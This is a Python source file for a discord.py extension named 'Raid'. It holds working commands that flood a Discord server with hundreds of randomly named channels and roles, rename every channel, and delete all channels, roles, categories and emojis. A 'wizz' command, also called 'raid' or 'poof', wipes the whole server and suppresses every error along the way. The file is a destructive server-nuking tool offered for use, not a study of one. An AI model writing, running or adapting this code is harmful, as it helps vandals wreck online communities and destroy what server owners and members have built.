import discord
import string
import random

from discord.ext import commands

def random_string(length):
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str


class Raid(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=["ct", "text"], usage="[amount] (arguments)")
    async def createtext(self, ctx, amount: int, *, msg=None):
        """Creates a custom amount of text channels."""
        if int(amount) > 250:
            return await ctx.send(':x: *Limit: 250*', delete_after=3)
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for _i in range(amount):
            if msg == None:
                await ctx.guild.create_text_channel(random_string(69))
            else:
                await ctx.guild.create_text_channel(msg)

    @commands.command(aliases=["cv", "voice"], usage="[amount] (arguments)")
    async def createvoice(self, ctx, amount: int, *, msg=None):
        """Creates a custom amount of voice channels."""
        if int(amount) > 250:
            return await ctx.send(':x: *Limit: 250*', delete_after=3)
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for _i in range(amount):
            if msg == None:
                await ctx.guild.create_voice_channel(random_string(69))
            else:
                await ctx.guild.create_voice_channel(msg)

    @commands.command(aliases=["ccat", "cate"], usage="[amount] (arguments)")
    async def createcategory(self, ctx, amount: int, *, msg=None):
        """Creates a custom amount of categories."""
        if int(amount) > 250:
            return await ctx.send(':x: *Limit: 250*', delete_after=3)
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for _i in range(amount):
            if msg == None:
                await ctx.guild.create_category_channel(random_string(69))
            else:
                await ctx.guild.create_category_channel(msg)

    @commands.command(aliases=["rc"])
    async def renamechannels(self, ctx, *, msg=None):
        """Renames every channel in a server."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for channel in ctx.guild.channels:
            try:
                if msg == None:
                    await channel.edit(name=random_string(69))
                else:
                    await channel.edit(name=msg)
            except Exception:
                pass

    @commands.command(aliases=["cr", "role"], usage="[amount] (arguments)")
    async def createrole(self, ctx, amount: int, *, msg=None):
        """Creates a custom amount of roles."""
        if int(amount) > 250:
            return await ctx.send(':x: *Limit: 250*', delete_after=3)
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for _i in range(amount):
            r = random.randint(0, 255)
            g = random.randint(0, 255)
            b = random.randint(0, 255)
            if msg == None:
                await ctx.guild.create_role(name=random_string(69), colour=discord.Colour.from_rgb(r, g, b))
            else:
                await ctx.guild.create_role(name=msg, colour=discord.Colour.from_rgb(r, g, b))

    @commands.command(aliases=["dc"], usage="[amount] (arguments)")
    async def deletechannels(self, ctx):
        """Deletes all channels in a server."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

    @commands.command(aliases=["dt"])
    async def deletetext(self, ctx):
        """Deletes all text channels."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for channel in ctx.guild.channels:
            if str(channel.type) == 'text':
                try:
                    await channel.delete()
                except Exception:
                    pass

    @commands.command(aliases=["dv"])
    async def deletevoice(self, ctx):
        """Deletes all voice channels."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for channel in ctx.guild.channels:
            if str(channel.type) == 'voice':
                try:
                    await channel.delete()
                except Exception:
                    pass

    @commands.command(aliases=["dcat"])
    async def deletecategory(self, ctx):
        """Deletes all categories."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for channel in ctx.guild.channels:
            if str(channel.type) == 'category':
                try:
                    await channel.delete()
                except Exception:
                    pass

    @commands.command(aliases=["dr"])
    async def deleterole(self, ctx):
        """Deletes all roles."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except Exception:
                pass

    @commands.command(aliases=["raid", "poof"])
    async def wizz(self, ctx):
        """Deletes everything."""
        if bool(ctx.guild) == False:
            return await ctx.send(':x: *dm channels are prohibited*', delete_after=3)
        await ctx.guild.edit(name=random_string(16))
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
            except Exception:
                pass
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except Exception:
                pass
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass


def setup(bot):
    bot.add_cog(Raid(bot))
